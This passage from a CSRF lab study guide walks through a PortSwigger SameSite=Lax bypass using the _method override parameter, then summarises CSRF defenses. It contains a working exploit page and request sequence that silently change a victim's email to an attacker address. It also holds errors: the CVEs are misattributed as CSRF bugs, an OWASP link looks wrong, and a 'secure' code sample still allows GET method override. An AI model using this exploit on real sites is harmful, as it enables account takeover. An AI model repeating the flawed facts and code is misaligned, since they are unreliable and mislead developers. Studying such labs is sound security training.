8. **Real-world pattern**: Many organizations use subdomains for services
9. **Complexity ≠ security**: Multiple improperly configured defenses = vulnerable

---

## Lab 11: SameSite Lax Bypass via Method Override

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates bypassing SameSite=Lax protection using HTTP method override. The vulnerability:

1. **SameSite=Lax (Default)**: Session cookies use Lax restrictions, allowing cookies in top-level navigation GET requests
2. **No CSRF Tokens**: Email change lacks CSRF validation
3. **Method Override Parameter**: Application accepts `_method` parameter to override HTTP methods

**The attack**:
- SameSite=Lax allows cookies in cross-site GET requests (top-level navigation)
- `_method=POST` parameter tricks server into processing as POST
- Application accepts: `GET /my-account/change-email?email=x&_method=POST`
- Bypasses "POST isn't allowed cross-site" protection

### Step-by-Step Solution

#### Step 1: Analyze Cookie Behavior

1. Log in with `wiener:peter`
2. Check cookie attributes:

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

Note: `SameSite=Lax` is default in modern browsers if not specified.

#### Step 2: Understand SameSite=Lax

| Request Type | Cookies Included |
|--------------|------------------|
| Link click (GET) | Yes |
| Form submission (POST) | No |
| Top-level navigation (GET) | Yes |
| Embedded requests (img, script) | No |
| XMLHttpRequest/Fetch | No |

**Key**: GET requests via top-level navigation include cookies.

#### Step 3: Test Email Change Functionality

1. Submit email change and capture:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

2. No CSRF token present

#### Step 4: Test Method Override

1. Send to Repeater
2. Convert to GET manually:

```http
GET /my-account/change-email?email=test@example.com HTTP/1.1
```

May fail (depends on implementation)

3. Add `_method` parameter:

```http
GET /my-account/change-email?email=test@example.com&_method=POST HTTP/1.1
```

**Result: Succeeds!** Email changes.

**Vulnerability confirmed**: Server accepts `_method=POST` in GET requests.

#### Step 5: Create Exploit with Top-Level Navigation

```html
<html>
  <body>
    <script>
      document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@attacker.com&_method=POST";
    </script>
  </body>
</html>
```

**How it works**:
1. Victim visits exploit page
2. `document.location` performs top-level navigation
3. Browser makes GET request
4. SameSite=Lax allows session cookie in top-level GET
5. Server processes `_method=POST` override
6. Email changes without CSRF token

#### Step 6: Deploy and Deliver

1. Paste into exploit server Body
2. Store and test with "View exploit" (use Chrome/Chromium)
3. Verify email changes
4. Update email to unique value
5. Deliver exploit to victim

### HTTP Requests and Responses

**Traditional POST Request:**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=K9mL3vP7wX2nR5tY
Content-Type: application/x-www-form-urlencoded

email=user@example.com

Response:
HTTP/1.1 302 Found
```

**Method Override via GET (Vulnerability):**
```http
GET /my-account/change-email?email=pwned@attacker.com&_method=POST HTTP/1.1
Cookie: session=K9mL3vP7wX2nR5tY
Referer: https://exploit-server.exploit-server.net/

Response:
HTTP/1.1 302 Found
```

### Method Override Patterns

| Framework | Parameter Name | Example |
|-----------|---------------|---------|
| Express.js | `_method` | `?_method=POST` |
| Ruby on Rails | `_method` | `?_method=PUT` |
| Laravel | `_method` | `?_method=DELETE` |
| Django | X-HTTP-Method-Override | Header-based |
| Custom | Varies | `method`, `_verb`, etc. |

**This lab uses**: `_method=POST`

### Browser Compatibility

| Browser | SameSite=Lax Default | Notes |
|---------|---------------------|-------|
| Chrome 91+ | Yes | Default if not specified |
| Firefox 90+ | Yes | Default if not specified |
| Safari 13+ | Partial | Different implementation |
| Edge 86+ | Yes | Chromium-based |

**Lab recommendation**: Use Chrome/Chromium for consistent behavior.

### Burp Suite Features Used

1. **Proxy > HTTP History**: Observe cookie attributes
2. **Repeater**: Test method override parameters
3. **Manual Request Modification**: Convert POST to GET, add parameters
4. **Exploit Server**: Host and deliver payload
5. **Browser Integration**: Test actual navigation behavior

### Common Mistakes

1. **Wrong browser**: Safari/Firefox may have different SameSite behavior
2. **Using fetch/XMLHttpRequest**: These don't trigger top-level navigation
3. **Email conflicts**: Using duplicate addresses
4. **Wrong parameter name**: Using `method=POST` instead of `_method=POST`
5. **Including form element**: Using `<form>` instead of JavaScript navigation
6. **Testing with embedded requests**: Images/iframes don't work (not top-level)

### Troubleshooting Tips

- **Cookies not included**: Ensure testing with Chrome/Chromium
- **Method override not working**: Try variations (`_method`, `method`, `_verb`)
- **Request rejected**: Verify exact parameter name and format
- **Lab doesn't solve**: Confirm victim's email changed
- **Works in Repeater but not exploit**: Must use top-level navigation

### Vulnerable Code Example

```javascript
// Vulnerable: Method override enabled globally
const methodOverride = require('method-override');
app.use(methodOverride('_method'));

app.post('/my-account/change-email', (req, res) => {
    // No CSRF validation
    updateEmail(req.session.user, req.body.email);
    res.redirect('/my-account');
});
```

### Secure Implementation

```javascript
app.post('/my-account/change-email', csrfProtection, (req, res) => {
    // CSRF middleware validates token
    updateEmail(req.session.user, req.body.email);
    res.redirect('/my-account');
});

// Restrict method override
app.use(methodOverride('_method', {
    methods: ['GET']  // Only for safe resources
}));
```

### Defense Recommendations

1. **Implement CSRF tokens**: Even with SameSite, use tokens
2. **Restrict method override**: Only for specific safe endpoints
3. **Use SameSite=Strict**: For sensitive applications
4. **Enforce HTTP methods**: Don't allow GET to modify state
5. **Framework configuration**: Review method override middleware
6. **Method validation**: Explicitly check request method server-side

### Key Takeaways

1. **SameSite=Lax isn't foolproof**: Top-level navigation allows cookies in GET
2. **Method override is convenient but dangerous**: Convenience features become security holes
3. **GET should be safe**: Never allow GET to modify state
4. **Framework features matter**: Understand security implications
5. **Defense in depth**: SameSite + CSRF tokens + method restrictions
6. **Browser differences**: Test across multiple browsers
7. **Top-level navigation is special**: Browsers treat it differently
8. **Method override should be restricted**: Only for specific use cases

---

## CSRF Defense Summary

### Defense Mechanisms Comparison

| Defense Type | Strength | Vulnerabilities | Labs |
|--------------|----------|-----------------|------|
| **CSRF Tokens** | Strong if properly implemented | Method-based validation, session binding issues, presence checks | 2-6 |
| **Referer Validation** | Weak | Header removal, substring matching | 7-8 |
| **SameSite Cookies** | Moderate | Client-side redirects, sibling domains, method override | 9-11 |
| **None** | None | Trivial exploitation | 1 |

### Attack Techniques by Category

#### Token-Based Bypasses
1. **Method-based validation** (Lab 2): Use GET instead of POST
2. **Session binding issues** (Lab 3): Use attacker's token for victim
3. **Non-session cookie binding** (Lab 4): Inject csrfKey cookie + use matching token
4. **Double submit cookie** (Lab 5): Inject arbitrary matching cookie/parameter
5. **Presence-based validation** (Lab 6): Omit token parameter entirely

#### Referer-Based Bypasses
6. **Header suppression** (Lab 7): Use `<meta name="referrer" content="no-referrer">`
7. **Substring matching** (Lab 8): Include legitimate domain in query string

#### SameSite Bypasses
8. **Client-side redirect gadget** (Lab 9): Path traversal via same-site redirect
9. **Sibling domain XSS** (Lab 10): XSS on subdomain for same-site attack
10. **Method override** (Lab 11): Use `_method=POST` in GET request with Lax cookies

### Comprehensive Defense Strategy

#### 1. CSRF Tokens (Primary Defense)
```python
# Secure token implementation
def generate_csrf_token(session_id):
    token = secrets.token_urlsafe(32)
    # Store server-side, tied to session
    session_store[session_id] = {
        'csrf_token': token,
        'created': datetime.now(),
        'expires': datetime.now() + timedelta(hours=1)
    }
    return token

def validate_csrf_token(token, session_id):
    stored = session_store.get(session_id)
    if not stored:
        return False
    if stored['csrf_token'] != token:
        return False
    if datetime.now() > stored['expires']:
        return False
    return True
```

**Requirements**:
- Cryptographically secure random tokens
- Server-side storage tied to sessions
- Validate on ALL state-changing operations
- Enforce on ALL HTTP methods
- Require token presence
- Implement expiration

#### 2. SameSite Cookies (Secondary Defense)
```python
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

**Options**:
- `SameSite=Strict`: Maximum protection, may break legitimate cross-site flows
- `SameSite=Lax`: Balances security and usability (default in modern browsers)
- `SameSite=None; Secure`: Only for legitimate cross-site needs

**Additional considerations**:
- Set on exact domain, not parent domain
- Use Strict for sensitive applications
- Don't rely solely on SameSite

#### 3. Additional Defenses

**Custom Headers** (for AJAX requests):
```javascript
fetch('/api/sensitive-action', {
    method: 'POST',
    headers: {
        'X-Custom-Header': 'required-value',
        'X-CSRF-Token': csrf_token
    },
    credentials: 'same-origin'
});
```

**Origin/Referer Validation** (supplementary):
```python
def validate_origin(request):
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')

    if origin:
        parsed = urlparse(origin)
    elif referer:
        parsed = urlparse(referer)
    else:
        return False  # Require at least one

    return parsed.hostname == expected_domain
```

**User Interaction** (for critical actions):
- Require password re-entry
- Implement CAPTCHA
- Use transaction confirmation codes

### Framework-Specific Implementation

#### Django
```python
from django.middleware.csrf import CsrfViewMiddleware
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def change_email(request):
    if request.method == 'POST':
        # CSRF automatically validated by middleware
        email = request.POST.get('email')
        request.user.email = email
        request.user.save()
```

#### Flask
```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

@app.route('/change-email', methods=['POST'])
def change_email():
    # CSRF automatically validated
    email = request.form.get('email')
    current_user.email = email
    db.session.commit()
```

#### Express.js
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/change-email', csrfProtection, (req, res) => {
    // CSRF automatically validated
    const email = req.body.email;
    updateUserEmail(req.session.userId, email);
    res.redirect('/account');
});
```

### Testing Methodology

#### Manual Testing Checklist
- [ ] Test all HTTP methods (GET, POST, PUT, DELETE, PATCH)
- [ ] Test with missing CSRF token
- [ ] Test with invalid CSRF token
- [ ] Test with token from different user session
- [ ] Test with tampered token
- [ ] Test with expired token
- [ ] Test Referer header manipulation
- [ ] Test Referer header removal
- [ ] Test with different Origin headers
- [ ] Test SameSite cookie behavior
- [ ] Look for client-side redirects with user input
- [ ] Check for sibling domains with vulnerabilities
- [ ] Test method override parameters
- [ ] Test WebSocket endpoints

#### Automated Testing Tools
- **Burp Suite Scanner**: Automated CSRF detection
- **OWASP ZAP**: Active scanner with CSRF checks
- **Custom scripts**: Test token validation logic
- **Framework test suites**: Built-in security tests

### Common Implementation Mistakes

1. **Conditional validation**: Only validating when token is present
2. **Method-based validation**: Only validating POST, ignoring GET/PUT/DELETE
3. **Session separation**: Not tying tokens to specific user sessions
4. **Client-side validation**: Validating tokens in JavaScript, not server-side
5. **Cookie-based validation**: Using double-submit without server storage
6. **Substring matching**: Checking if string exists instead of parsing origin
7. **Framework misuse**: Not enabling or configuring CSRF protection
8. **GET state changes**: Allowing GET requests to modify data
9. **Global method override**: Enabling method override for all endpoints
10. **Subdomain cookie sharing**: Not scoping cookies properly

### Real-World Attack Scenarios

#### Scenario 1: Account Takeover via Email Change
1. Attacker finds CSRF vulnerability in email change
2. Creates exploit to change victim's email to attacker@evil.com
3. Uses "Forgot Password" to reset password
4. Gains full account access

#### Scenario 2: Unauthorized Financial Transaction
1. Banking application has CSRF in money transfer
2. Attacker creates page that transfers funds to attacker's account
3. Victims visiting the page unknowingly transfer money

#### Scenario 3: Administrative Action Abuse
1. Admin panel has CSRF vulnerability
2. Attacker tricks admin into visiting malicious page
3. Exploit creates new admin account for attacker
4. Attacker gains full system control

### Industry Standards and References

#### OWASP Resources
- **OWASP Top 10 2021**: A01:2021 – Broken Access Control (includes CSRF)
- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetsecurity.org/cheatsheets/cross-site-request-forgery-prevention-cheat-sheet.html
- **OWASP Testing Guide**: CSRF testing methodologies

#### Standards and Guidelines
- **PCI DSS 6.5.9**: Requirement for CSRF protection in payment applications
- **NIST SP 800-53**: SC-8 Transmission Confidentiality and Integrity
- **CWE-352**: Cross-Site Request Forgery (CSRF)
- **MITRE ATT&CK**: T1190 - Exploit Public-Facing Application

#### Notable CVEs
- **CVE-2020-9484**: Apache Tomcat CSRF via session fixation
- **CVE-2019-11358**: jQuery XSS leading to CSRF bypass
- **CVE-2018-1000600**: Jenkins CSRF vulnerability
- **CVE-2017-5638**: Apache Struts CSRF (led to Equifax breach)

### Advanced Topics

#### CSRF in Modern SPAs
Single-Page Applications require different approaches:
- Store tokens in JavaScript memory (not localStorage)
- Include tokens in Authorization headers
- Validate on API endpoints
- Use short-lived tokens

#### CSRF and WebSockets
WebSockets don't send cookies in handshake headers in some contexts:
- Validate CSRF token in first message
- Check Origin header in handshake
- Implement connection authentication

#### CSRF Gadgets
Look for:
- Open redirects
- Client-side URL construction
- Subdomain takeover possibilities
- Same-site scripting opportunities

### Lab Difficulty Progression

| Difficulty | Labs | Skills Required |
|------------|------|-----------------|
| **Apprentice** | 1 | Basic HTML, Burp Suite basics |
| **Practitioner** | 2-9, 11 | HTTP methods, cookies, JavaScript, encoding, debugging |
| **Expert** | 10 | XSS, WebSockets, same-site vs cross-origin, attack chaining |

### Conclusion

CSRF remains a critical vulnerability despite widespread awareness. Key principles:

1. **Defense in depth**: Layer multiple protections
2. **Framework usage**: Use built-in protections correctly
3. **Proper implementation**: Tokens must be tied to sessions
4. **HTTP semantics**: GET for safe operations, POST for state changes
5. **Regular testing**: Test for CSRF in all state-changing operations
6. **User education**: Train developers on secure coding practices

By mastering these labs and understanding the underlying principles, you'll be equipped to identify, exploit, and remediate CSRF vulnerabilities in real-world applications.
